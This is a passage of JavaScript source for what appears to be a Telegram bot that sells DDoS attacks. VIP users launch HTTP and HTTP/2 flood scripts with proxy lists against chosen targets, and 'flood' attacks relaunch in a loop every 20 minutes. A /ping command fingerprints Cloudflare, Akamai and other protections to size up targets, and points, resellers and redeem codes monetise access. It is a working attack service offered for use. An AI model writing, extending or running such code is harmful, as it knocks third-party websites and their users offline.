    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'kill') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'bypass') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'raw') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration}`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'thunder') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'rape') {
    pushOngoing(target, methods, duration);
    // note: argument order as you provided
    runAttackCommand(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'storm') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'destroy') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'h2-flood') {
    pushOngoing(target, methods, duration);
    // you haven't included exec for 'slim' in the initial snippet — generic example:
    runAttackCommand(`node ${metode} ${target} ${duration} 100 110 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else {
    const msgNotRecognized = `Method ${methods} not recognized.`;
    console.log(msgNotRecognized);
    try { await bot.sendMessage(chatId, msgNotRecognized); } catch (_) {}
  }
});
bot.onText(/^\/poin$/, async (msg) => {
  const chatId = msg.chat.id;
  const uid = String(msg.from.id);
  const pts = await getPoints(uid);
  const reply = `🎯 Your points: ${pts}\n\nShare this link to get points: https://t.me/${BOT_NAME}?start=ref_${uid}`;
  await bot.sendMessage(chatId, reply, { disable_web_page_preview: true });
});
const SECURITY_PROVIDERS = [
  {
    name: "Cloudflare",
    cnameIncludes: ["cloudflare"],
    headerContains: ["cf-ray", "cf-cache-status", "server: cloudflare"],
    cookieName: ["__cf_bm", "__cfduid", "cf_clearance"]
  },
  {
    name: "Akamai",
    cnameIncludes: ["akamaiedge", "akamai"],
    headerContains: ["server: akamai", "x-akamai-request-id"],
    cookieName: []
  },
  {
    name: "Fastly",
    cnameIncludes: ["fastly"],
    headerContains: ["x-served-by", "x-cache", "server: fastly"],
    cookieName: []
  },
  {
    name: "Imperva (Incapsula)",
    cnameIncludes: ["incapdns", "incapsula"],
    headerContains: ["x-cdn", "x-iinfo", "x-incap-clientip"],
    cookieName: ["incap_ses"]
  },
  {
    name: "Sucuri",
    cnameIncludes: ["sucuri"],
    headerContains: ["x-sucuri-id", "server: sucuri"],
    cookieName: []
  },
  {
    name: "DDoS-Guard",
    cnameIncludes: ["ddos-guard", "ddosguard"],
    headerContains: ["server: ddos-guard"],
    cookieName: []
  },
  {
    name: "Cloudbric",
    cnameIncludes: ["cloudbric"],
    headerContains: ["x-cloudbric"],
    cookieName: []
  },
  {
    name: "StackPath",
    cnameIncludes: ["stackpath"],
    headerContains: ["server: stackpath"],
    cookieName: []
  },
  {
    name: "AWS WAF / Amazon CloudFront",
    cnameIncludes: ["cloudfront", "amazonaws"],
    headerContains: ["x-amz-cf-id", "x-amz-request-id", "server: cloudfront"],
    cookieName: []
  },
  {
    name: "Radware",
    cnameIncludes: ["radware"],
    headerContains: ["x-radware-request-id"],
    cookieName: []
  },
  // Add other providers here as needed...
];

// ====== Detect security provider based on headers, cookies, and DNS/CNAME ======
async function detectSecurityProviders(domain, headers, rawSetCookie) {
  const found = new Set();

  const hdrStr = Object.entries(headers || {})
    .map(([k, v]) => `${k}: ${v}`)
    .join("\n")
    .toLowerCase();

  const cookieStr = (rawSetCookie || []).join(" ").toLowerCase();

  // 1) Check CNAME / DNS (try resolve CNAME, A)
  try {
    const cnames = [];
    try {
      const c = await dns.resolveCname(domain);
      if (c && c.length) cnames.push(...c.map(s => s.toLowerCase()));
    } catch (e) {
      // CNAME doesn't always exist, ignore error
    }
    // Resolve A for IP range indication (optional)
    try {
      const as = await dns.resolve4(domain);
      if (as && as.length) cnames.push(...as.map(s => s.toLowerCase()));
    } catch (e) {}

    // per provider check cnameIncludes
    for (const p of SECURITY_PROVIDERS) {
      const cnameMatch = p.cnameIncludes && p.cnameIncludes.some(ci => cnames.some(c => c.includes(ci)));
      if (cnameMatch) found.add(p.name);
    }
  } catch (e) {
    // skip dns problems
  }

  // 2) Check headerContains and cookieName
  for (const p of SECURITY_PROVIDERS) {
    if (p.headerContains && p.headerContains.some(hc => hdrStr.includes(hc.toLowerCase()))) {
      found.add(p.name);
    }
    if (p.cookieName && p.cookieName.some(cn => cookieStr.includes(cn.toLowerCase()))) {
      found.add(p.name);
    }
    // Check server header specifically
    if (headers && headers.server && headers.server.toLowerCase().includes((p.name || "").toLowerCase())) {
      found.add(p.name);
    }
  }

  return Array.from(found);
}

bot.onText(/\/ping\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const raw = (match && match[1]) ? match[1].trim() : "";
  if (!raw) {
    await bot.sendMessage(chatId, `<b>Usage:</b>\n/ping <i>https://example.com</i>`, { parse_mode: "HTML" });
    return;
  }

  // Normalize URL — use variable targetUrl to avoid conflict with `url` module
  let targetUrl = raw;
  if (!/^https?:\/\//i.test(targetUrl)) targetUrl = "https://" + targetUrl;

  let domain;
  try {
    // use url.parse from 'url' module
    domain = url.parse(targetUrl).hostname;
    if (!domain) throw new Error("Hostname not found");
  } catch (e) {
    await bot.sendMessage(chatId, `❌ <b>Invalid URL.</b> Make sure to write: <code>/ping https://example.com</code>`, { parse_mode: "HTML" });
    return;
  }

  // Send initial notification
  const loadingMsg = await bot.sendMessage(chatId, `🔍 <b>Analyzing:</b> <i>${escapeHtml(domain)}</i>\n⏳ Please wait, performing several checks...`, { parse_mode: "HTML" });

  try {
    const TOTAL = 12; // number of attempts, can be changed
    const TIMEOUT = 6000; // ms
    const requests = [];

    // Run parallel requests using Promise.all to be fast and more "real"
    for (let i = 0; i < TOTAL; i++) {
      requests.push((async () => {
        const start = Date.now();
        try {
          const resp = await axios.get(targetUrl, {
            timeout: TIMEOUT,
            validateStatus: () => true,
            headers: {
              "User-Agent": `Mozilla/5.0 (compatible; InfoBot/1.0; +https://t.me/yourbot)`,
            },
          });
          const time = Date.now() - start;
          return { ok: true, status: resp.status, time, headers: resp.headers, setCookie: resp.headers['set-cookie'] || [] };
        } catch (err) {
          const time = Date.now() - start;
          return { ok: false, err: err.message, time, status: null, headers: null, setCookie: [] };
        }
      })());
    }

    const results = await Promise.all(requests);

    // Statistics
    const total = results.length;
    const successful = results.filter(r => r.ok && r.status >= 200 && r.status < 300).length;
    const blocked = results.filter(r => !r.ok || (r.status && r.status >= 400 && r.status < 500)).length;
    const bypassed = results.filter(r => r.ok && (r.status >= 300 && r.status < 200 || r.status >= 500)).length;
    const avgTime = Math.round(results.filter(r => r && r.time).reduce((s, r) => s + (r.time||0), 0) / Math.max(1, results.length));

    // Get sample headers
    let sampleHeaders = null;
    let sampleCookies = [];
    for (const r of results) {
      if (r.headers) {
        sampleHeaders = r.headers;
        sampleCookies = r.setCookie || [];
        break;
      }
    }

    // Detect security providers
    const detectedProviders = await detectSecurityProviders(domain, sampleHeaders || {}, sampleCookies || []);
    const penyedia = detectedProviders.length ? detectedProviders.join(", ") : "Not detected";

    // Percentages
    const blockedPerc = ((blocked / total) * 100).toFixed(1);
    const sucPerc = ((successful / total) * 100).toFixed(1);
    const bypassedPerc = ((bypassed / total) * 100).toFixed(1);

    let tingkatKeamanan = "Low";
    if (detectedProviders.length && parseFloat(blockedPerc) >= 30) tingkatKeamanan = "High";
    else if (detectedProviders.length) tingkatKeamanan = "Medium";
    else if (parseFloat(blockedPerc) >= 30) tingkatKeamanan = "Medium";

    // Progress bar visual
    const successBar = createProgressBar(successful, total, 12);
    const blockedBar = createProgressBar(blocked, total, 12);
    const bypassBar = createProgressBar(bypassed, total, 12);

    // Server / technology (from header)
    const serverHeader = (sampleHeaders && sampleHeaders.server) ? sampleHeaders.server : "Not available";
    const xPoweredBy = (sampleHeaders && sampleHeaders['x-powered-by']) ? sampleHeaders['x-powered-by'] : "-";

    // Compose message (HTML)
    const caption = `
<b>📡 Ping Result: ${escapeHtml(domain)}</b>

<b>Speed :</b> ${avgTime} ms
<b>Security :</b> ${escapeHtml(penyedia)}
<b>Security Level :</b> ${escapeHtml(tingkatKeamanan)}
    `;

    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });

  } catch (err) {
    await bot.editMessageText(`❌ <b>Failed to analyze ${escapeHtml(domain)}</b>\nError: <code>${escapeHtml(err.message || String(err))}</code>`, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML"
    });
  }
});

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
const TELEGRAM_LIMIT_MB = 49;
const TELEGRAM_LIMIT_BYTES = TELEGRAM_LIMIT_MB * 1024 * 1024;


// ====== Helper function zip ======
function zipFolderStream(sources, outPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", resolve);
    archive.on("error", reject);
    archive.pipe(output);

    const baseDir = process.cwd();

    // If `sources` is an array of files & folders
    for (const src of sources) {
      const target = path.join(baseDir, src);
      if (!fs.existsSync(target)) continue;

      const stat = fs.statSync(target);
      if (stat.isDirectory()) {
        archive.directory(target, src, {
          ignore: [
            "**/node_modules/**",
            "**/.git/**",
            "**/tmp/**",
            "**/temp/**",
            "**/logs/**"
          ],
        });
      } else {
        archive.file(target, { name: src });
      }
    }

    archive.finalize();
  });
}

// ====== Function to send file to owner ======
async function sendFileToOwner(filePath, caption) {
  await bot.sendDocument(OWNER_ID, filePath, {
    caption,
    parse_mode: "HTML",
  });
}

// ====== Command /file or /file all ======
bot.onText(/^\/backup(?:@[\w_]+)?(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || msg.from.last_name || senderId;

  // Only owner
  if (senderId.toString() !== OWNER_ID.toString()) {
    return bot.sendMessage(
      chatId,
      `<b>❌ Access denied!</b>\nThis command is for owner only.`,
      { parse_mode: "HTML" }
    );
  }

  const arg = (match[1] || "all").trim().toLowerCase();
  const baseDir = process.cwd();
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bot-zip-"));
  const zipName = `backup-${arg}-${Date.now()}.zip`;
  const zipPath = path.join(tmpDir, zipName);

  try {
    let sources;

    if (arg === "all") {
      sources = [
        "menu.js",
        "index.js",
        "package.json",
        "lib",
        "database",
        "config.js"
      ];
      await bot.sendMessage(
        chatId,
        `<b>📦 Compressing important panel files...</b>\nWithout <code>node_modules</code> & junk files.`,
        { parse_mode: "HTML" }
      );
    } else {
      // If user types specific name
      sources = [arg];
      await bot.sendMessage(
        chatId,
        `<b>📦 Compressing:</b> <code>${arg}</code>`,
        { parse_mode: "HTML" }
      );
    }

    await zipFolderStream(sources, zipPath);

    const sizeBytes = fs.statSync(zipPath).size;
    const sizeMB = (sizeBytes / 1024 / 1024).toFixed(2);

    await bot.sendMessage(
      chatId,
      `<b>✅ Compression finished!</b>\n<b>📁 Name:</b> <code>${zipName}</code>\n<b>📦 Size:</b> ${sizeMB} MB`,
      { parse_mode: "HTML" }
    );

    if (sizeBytes <= TELEGRAM_LIMIT_BYTES) {
      await bot.sendMessage(chatId, `<b>📤 Sending ZIP to owner...</b>`, { parse_mode: "HTML" });
      await sendFileToOwner(
        zipPath,
        `Backup ${arg === "all" ? "important panel files" : arg} by ${senderName}`
      );
      await bot.sendMessage(chatId, `<b>✅ ZIP file successfully sent to owner.</b>`, { parse_mode: "HTML" });
    } else {
      await bot.sendMessage(
        chatId,
        `<b>⚠️ File too large (>{TELEGRAM_LIMIT_MB} MB)</b>\nPlease retrieve it manually from the server.`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("/file error:", err);
    await bot.sendMessage(
      chatId,
      `<b>❌ An error occurred:</b>\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  } finally {
    try {
      if (fs.existsSync(tmpDir)) fse.removeSync(tmpDir);
    } catch (e) {
      console.warn("⚠️ Failed to delete temporary directory:", e.message);
    }
  }
});

const RESELLER_FILE = './database/reseller.json';


// ===== Reseller Functions =====
function loadResellers() {
  if (!fs.existsSync(RESELLER_FILE)) fs.writeFileSync(RESELLER_FILE, '{}', 'utf8');
  try {
    return JSON.parse(fs.readFileSync(RESELLER_FILE, 'utf8') || '{}');
  } catch {
    return {};
  }
}

function saveResellers(obj) {
  fs.writeFileSync(RESELLER_FILE, JSON.stringify(obj, null, 2), 'utf8');
}

function isReseller(id) {
  const data = loadResellers();
  return !!data[id];
}

function addReseller(id) {
  const data = loadResellers();
  data[id] = true;
  saveResellers(data);
}

function delReseller(id) {
  const data = loadResellers();
  delete data[id];
  saveResellers(data);
}

// ===== Command /addreseller =====
bot.onText(/^\/addres\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];

  if (senderId !== OWNER_ID) return bot.sendMessage(chatId, '❌ Only Owner can add a reseller.');

  addReseller(targetId);
  await bot.sendMessage(chatId, `✅ User ${targetId} is now a Reseller.`);
});

// ===== Command /delreseller =====
bot.onText(/^\/delres\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];

  if (senderId !== OWNER_ID) return bot.sendMessage(chatId, '❌ Only Owner can remove a reseller.');

  delReseller(targetId);
  await bot.sendMessage(chatId, `🗑️ User ${targetId} has been removed from the reseller list.`);
});

const REDEEM_FILE = path.join(__dirname, "/database/redeem_codes.json");

// === CHECK & CREATE FILE ===
if (!fs.existsSync(REDEEM_FILE)) fs.writeFileSync(REDEEM_FILE, "{}", "utf8");

// === LOAD & SAVE ===
function loadCodes() {
  try {
    return JSON.parse(fs.readFileSync(REDEEM_FILE, "utf8") || "{}");
  } catch {
    return {};
  }
}
function saveCodes(obj) {
  fs.writeFileSync(REDEEM_FILE, JSON.stringify(obj, null, 2), "utf8");
}

// === CONVERT DURATION ===
function parseDuration(str) {
  if (!str) return 0;
  const num = parseInt(str);
  if (isNaN(num)) return 0;
  const unit = str.slice(-1).toLowerCase();
  switch (unit) {
    case "m":
      return num * 60 * 1000;
    case "h":
      return num * 60 * 60 * 1000;
    case "d":
      return num * 24 * 60 * 60 * 1000;
    default:
      return num * 1000;
  }
}

// === FORMAT DATE ===
function formatDate(ts) {
  return new Date(ts).toLocaleString("id-ID", { timeZone: "Asia/Makassar" });
}

// === COMMAND /ADDKODE ===
bot.onText(/^\/addkode\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (sender !== OWNER_ID)
    return bot.sendMessage(chatId, "❌ Only owner can create codes.");

  const input = match[1].trim();
  const parts = input.split(",").map((p) => p.trim());

  if (parts.length < 3 || parts.length > 4)
    return bot.sendMessage(
      chatId,
      "⚙️ Invalid format!\nUse one of the following formats:\n\n" +
        "• `/addkode REXZY123,5,1h`\n  → Unlimited users\n\n" +
        "• `/addkode REXZYVIP,10,1d,5`\n  → Limit of 5 users\n",
      { parse_mode: "Markdown" }
    );

  const [kodeRaw, poinRaw, durasiRaw, totalRaw] = parts;
  const kode = kodeRaw.toUpperCase();
  const poin = Number(poinRaw);
  const durasiMs = parseDuration(durasiRaw);
  const total = totalRaw ? Number(totalRaw) : null;

  if (!kode || isNaN(poin) || poin <= 0 || durasiMs <= 0)
    return bot.sendMessage(
      chatId,
      "⚠️ Invalid format!\nExample: `/addkode REXZY123,5,1h`",
      { parse_mode: "Markdown" }
    );

  const codes = loadCodes();
  if (codes[kode])
    return bot.sendMessage(
      chatId,
      `⚠️ Code *${kode}* already exists.`,
      { parse_mode: "Markdown" }
    );

  const now = Date.now();
  codes[kode] = {
    poin,
    dibuatOleh: sender,
    dibuatPada: now,
    kadaluarsa: now + durasiMs,
    totalUser: total, // null means unlimited
    sudahDigunakanOleh: [],
  };
  saveCodes(codes);

  const info =
    total === null
      ? `👥 *Unlimited users*`
      : `👥 User Limit: *${total}*`;

  return bot.sendMessage(
    chatId,
    `✅ Code successfully created!\n\n📦 Code: \`${kode}\`\n💰 Points: *${poin}*\n${info}\n🕒 Valid until: *${formatDate(
      now + durasiMs
    )}*`,
    { parse_mode: "Markdown" }
  );
});

// === COMMAND /REDEEM ===
bot.onText(/^\/redeem\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const username = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name;
  const kode = match[1].trim().toUpperCase();

  const codes = loadCodes();
  const data = codes[kode];
  if (!data)
    return bot.sendMessage(chatId, "❌ Code not found.");

  const now = Date.now();

  // Expired
  if (now > data.kadaluarsa) {
    delete codes[kode];
    saveCodes(codes);
    return bot.sendMessage(
      chatId,
      `⚠️ Code \`${kode}\` has *expired!*`,
      { parse_mode: "Markdown" }
    );
  }

  // Already used by user
  if (data.sudahDigunakanOleh.includes(userId))
    return bot.sendMessage(
      chatId,
      `🚫 You have already used code \`${kode}\`.`,
      { parse_mode: "Markdown" }
    );

  // If limit and already full
  if (data.totalUser && data.sudahDigunakanOleh.length >= data.totalUser) {
    delete codes[kode];
    saveCodes(codes);
    return bot.sendMessage(
      chatId,
      `⚠️ Code \`${kode}\` has reached its user limit.`,
      { parse_mode: "Markdown" }
    );
  }

  // Add points to user
  const total = incrementPoints(userId, data.poin); // Make sure you have this function
  data.sudahDigunakanOleh.push(userId);

  // Delete code if limit reached
  if (data.totalUser && data.sudahDigunakanOleh.length >= data.totalUser) {
    delete codes[kode];
  }

  saveCodes(codes);

  // Notification to user
  await bot.sendMessage(
    chatId,
    `🎉 Successfully redeemed code \`${kode}\`!\n💰 You got *${data.poin} points*\n💎 Total Points: *${total}*`,
    { parse_mode: "Markdown" }
  );

  // Notification to OWNER
  await bot.sendMessage(
    OWNER_ID,
    `👤 User *${username}* (ID: \`${userId}\`)\n💬 Just used code \`${kode}\``,
    { parse_mode: "Markdown" }
  );
});
// ===== Command /addpoin =====
bot.onText(/^\/addpoin\s+(\d+)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];
  const amount = Number(match[2]);

  if (senderId !== OWNER_ID && !isReseller(senderId))
    return bot.sendMessage(chatId, '❌ You do not have permission to add points.');

  if (Number.isNaN(amount) || amount <= 0)
    return bot.sendMessage(chatId, '⚠️ Point amount must be positive.');

  const total = incrementPoints(targetId, amount);
  await bot.sendMessage(chatId, `✅ Successfully added ${amount} points to user ${targetId}.\nTotal points: ${total}`);
});

// ===== Command /delpoin =====
bot.onText(/^\/delpoin\s+(\d+)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];
  const amount = Number(match[2]);

  if (senderId !== OWNER_ID && !isReseller(senderId))
    return bot.sendMessage(chatId, '❌ You do not have permission to subtract points.');

  if (Number.isNaN(amount) || amount <= 0)
    return bot.sendMessage(chatId, '⚠️ Point amount must be positive.');

  const success = consumePoint(targetId, amount);
  if (!success)
    return bot.sendMessage(chatId, `⚠️ User ${targetId} does not have enough points.`);

  const total = getPoints(targetId);
  await bot.sendMessage(chatId, `✅ Successfully subtracted ${amount} points from user ${targetId}.\nRemaining points: ${total}`);
});
bot.onText(/^\/listpoin$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const pts = loadJSON(POINTS_FILE);
    const entries = Object.entries(pts);

    if (entries.length === 0) {
      return bot.sendMessage(chatId, "📭 No points data stored.");
    }

    entries.sort((a, b) => b[1] - a[1]);
    const topList = entries.slice(0, 20);

    // Use regular quotes to write literal ```
    let text = "```" + "\n🏆 TOP 20 USERS - POINTS LIST\n\n";

    for (let i = 0; i < topList.length; i++) {
      const [id, point] = topList[i];
      const rank = (i + 1).toString().padStart(2, "0");
      text += `${rank}. ID: ${id} | 💰 ${point} points\n`;
    }

    text += `\n📊 Total Users: ${entries.length}\n` + "```"; // ← triple backtick literal

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Failed to load points list:", err.message);
    bot.sendMessage(chatId, "⚠️ An error occurred while loading the points list.");
  }
});
bot.onText(/^\/risetpoin\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);

  if (!OWNER_ID) return bot.sendMessage(chatId, "❌ OWNER_ID is not set.");
  if (senderId !== String(OWNER_ID)) return bot.sendMessage(chatId, "❌ Only OWNER can use this command.");

  const jumlah = Number(match[1]);
  if (!Number.isInteger(jumlah) || jumlah <= 0) return bot.sendMessage(chatId, "❌ Enter a valid reduction amount (positive integer).");

  try {
    const data = loadJSON(POINTS_FILE);
    const userIds = Object.keys(data);
    if (userIds.length === 0) return bot.sendMessage(chatId, "ℹ️ No users with points.");

    let totalReduced = 0;
    let affected = 0;

    for (const id of userIds) {
      const before = Number(data[id] || 0);
      if (before <= 0) continue;
      const after = Math.max(0, before - jumlah);
      const reduced = before - after;
      if (reduced > 0) {
        data[id] = after;
        totalReduced += reduced;
        affected++;
      }
    }

    saveJSON(POINTS_FILE, data);

    return bot.sendMessage(
      chatId,
      `✅ Success.\n\nAmount reduced per user: ${jumlah}\nAffected users: ${affected}\nTotal points reduced: ${totalReduced}`
    );
  } catch (err) {
    return bot.sendMessage(chatId, `❌ Failed to reset points: ${err.message || err}`);
  }
});
const persistentChecks = new Map();

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
const renderBar = (pct, width = 10) => {
  const filled = Math.round((pct / 100) * width);
  const empty = width - filled;
  return `[${"█".repeat(filled)}${"░".repeat(empty)}] ${pct}%`;
};
const DATABASE_DIR = path.join(__dirname, "database");
const VIP_FILE = path.join(DATABASE_DIR, "vips.json");

// === CHECK VIP FILE ===
if (!fs.existsSync(DATABASE_DIR)) {
  console.error("❌ 'database' folder not found! Create the folder first.");
  process.exit(1);
}

if (!fs.existsSync(VIP_FILE)) {
  console.log("📁 Creating new 'vips.json' file in database folder...");
  fs.writeFileSync(VIP_FILE, JSON.stringify({}, null, 2), "utf8");
  console.log("✅ File created successfully!");
}

// === VIP FUNCTIONS ===
function loadVIPs() {
  try {
    const raw = fs.readFileSync(VIP_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch (e) {
    console.error("❌ Failed to read vips.json file:", e);
    return {};
  }
}
function saveVIPs(data) {
  fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2), "utf8");
}
function isVIP(id) {
  const vips = loadVIPs();
  return !!vips[id];
}
function addVIP(id) {
  const vips = loadVIPs();
  vips[id.toString()] = { addedAt: new Date().toISOString() };
  saveVIPs(vips);
}
function delVIP(id) {
  const vips = loadVIPs();
  delete vips[id];
  saveVIPs(vips);
}
// === ADD & DELETE VIP FEATURE ===
bot.onText(/^\/addvip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const targetId = match[1];
  
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ You don't have permission to add VIP!");
  }

  if (!targetId) {
    return bot.sendMessage(chatId, "⚠️ Use format:\n`/addvip <user_id>`", { parse_mode: "Markdown" });
  }

  const vips = loadVIPs();
  if (vips[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User with ID *${targetId}* is already VIP!`, { parse_mode: "Markdown" });
  }

  addVIP(targetId);
  bot.sendMessage(chatId, `✅ Successfully added user *${targetId}* to the VIP list!`, { parse_mode: "Markdown" });
});


bot.onText(/^\/delvip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const targetId = match[1];
  
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ You don't have permission to remove VIP!");
  }

  if (!targetId) {
    return bot.sendMessage(chatId, "⚠️ Use format:\n`/delvip <user_id>`", { parse_mode: "Markdown" });
  }

  const vips = loadVIPs();
  if (!vips[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User with ID *${targetId}* not found in VIP list.`, { parse_mode: "Markdown" });
  }

  delVIP(targetId);
  bot.sendMessage(chatId, `🗑️ User *${targetId}* has been removed from the VIP list.`, { parse_mode: "Markdown" });
});

bot.onText(/^\/ddos(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const penggunaName = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  if (!isVIP(userId)) {
    return bot.sendMessage(chatId, `🚫 Sorry this feature is only for *VIP*.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❓ *Usage:*\n\n```\n/ddos https://example.com flood\n```", { parse_mode: "Markdown" });
  }

  const data = await loadCooldowns();
  if (!data.nocd[userId]) {
    const lastUsed = data.users[userId] || 0;
    const now = Date.now();
    if (now - lastUsed < COOLDOWN_MS) {
      const rem = COOLDOWN_MS - (now - lastUsed);
      const sisa = Math.ceil(rem / 1000);
      return bot.sendMessage(chatId, `⚠️ *${penggunaName}*, feature is still on cooldown.\nWait ${sisa} seconds.`, { parse_mode: "Markdown" });
    }
    data.users[userId] = Date.now();
    await saveCooldowns(data);
  }

  const input = match[1].trim().split(/\s+/);
  const target = input[0];
  const methodsRaw = input[1] || "flood";
  const methods = methodsRaw;
  const duration = 77777;
  const progressMsg = await bot.sendMessage(chatId, `Processing...\n\`\`\`\n${renderBar(0)}\n\`\`\``, { parse_mode: "Markdown" });

  for (let pct = 5; pct <= 100; pct += 5) {
    await sleep(700);
    await bot.editMessageText(`🔄 *Processing...*\n\n\`\`\`\n${renderBar(pct)}\n\`\`\`\n🎯 Target: ${target}`, {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown"
    });
  }

  let targetInfo = {};
  try {
    const hostname = new URL(target).hostname;
    const { data: ipdata } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    targetInfo = { isp: ipdata.isp || "-", ip: ipdata.query || "-", as: ipdata.as || "-" };
  } catch {
    targetInfo = { isp: "Failed to load", ip: "-", as: "-" };
  }

  const endAt = Date.now() + duration * 1000;
  const endTimeStr = new Date(endAt).toLocaleString("id-ID", { timeZone: "Asia/Makassar" });
  const finalMsg = `✅ *Process Complete*\n\n\`\`\`\n🎯 Target : ${target}\n⏱️ Duration : ${duration} seconds\n⚙️ Method : ${methods}\n🌐 ISP    : ${targetInfo.isp}\n💻 IP     : ${targetInfo.ip}\n🏢 AS     : ${targetInfo.as}\n📅 Ends at: ${endTimeStr}\n\`\`\``;

  await bot.editMessageText(finalMsg, {
    chat_id: chatId,
    message_id: progressMsg.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Check Target", url: `https://check-host.net/check-http?host=${encodeURIComponent(target)}` }]
      ]
    }
  });

  const metodePath = path.join(__dirname, "lib", "cache", `${methods}.js`);
  if (!fs.existsSync(metodePath)) return bot.sendMessage(chatId, `❌ *Method ${methods} not recognized.*`, { parse_mode: "Markdown" });

  const proxyPath = path.join(__dirname, "proxy.txt");
  if (!fs.existsSync(proxyPath)) {
    return bot.sendMessage(chatId, `❌ proxy.txt file not found. Process cancelled.`, { parse_mode: "Markdown" });
  }

  const cmd = `node ${metodePath} ${target} ${duration} 100 100 proxy.txt`;
  exec(cmd);

  const ownerMsg = `🔔 */ddos Usage*\n👤 ${penggunaName} (id: ${userId})\n🎯 ${target}\n⏱️ ${duration}s\n⚙️ ${methods}`;
  await bot.sendMessage(OWNER_ID, ownerMsg, { parse_mode: "Markdown" });

  if (methods.toLowerCase() === "flood") {
    if (persistentChecks.has(target)) return;
    const info = { active: true, attempts: 0 };
    persistentChecks.set(target, info);

    (async () => {
      while (info.active) {
        info.attempts++;
        const iterCmd = `node ${metodePath} ${target} ${duration} 100 100 proxy.txt`;
        exec(iterCmd);
        console.log("Attack finished, starting again");
        await sleep(20 * 60 * 1000);
      }
      persistentChecks.delete(target);
    })();
  }
});

bot.onText(/^\/listddos$/, async (msg) => {
  const chatId = msg.chat.id;
  if (persistentChecks.size === 0) {
    return bot.sendMessage(chatId, "📭 No active targets at this time.");
  }

  let teks = "📋 *List of Active Targets:*\n\n";
  let i = 1;
  for (const [target, info] of persistentChecks.entries()) {
    teks += `${i++}. ${target} (Attempt #${info.attempts})\n`;
  }

  await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

bot.onText(/^\/stopddos\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1].trim();

  if (!persistentChecks.has(target)) {
    return bot.sendMessage(chatId, `❌ Target *${target}* not found or already stopped.`, { parse_mode: "Markdown" });
  }

  const info = persistentChecks.get(target);
  info.active = false;
  persistentChecks.delete(target);

  await bot.sendMessage(chatId, `🛑 Check for *${target}* has been stopped.`, { parse_mode: "Markdown" });
});
